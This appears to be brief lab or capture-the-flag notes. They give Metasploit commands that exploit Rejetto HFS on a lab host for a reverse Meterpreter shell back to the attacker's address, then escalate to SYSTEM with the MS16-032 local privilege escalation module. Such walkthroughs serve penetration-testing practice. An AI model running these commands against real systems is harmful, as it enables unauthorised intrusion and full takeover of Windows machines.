## User
### With Metasploit
use exploit/windows/http/rejetto_hfs_exec
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOST 10.10.10.8
set SRVHOST 0.0.0.0
set SRVPORT 8080
set LHOST 10.10.14.131
set LPORT 1337
exploit
---
## Root
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set SESSION 1
set LPORT 1338
set LHOST 10.10.14.196
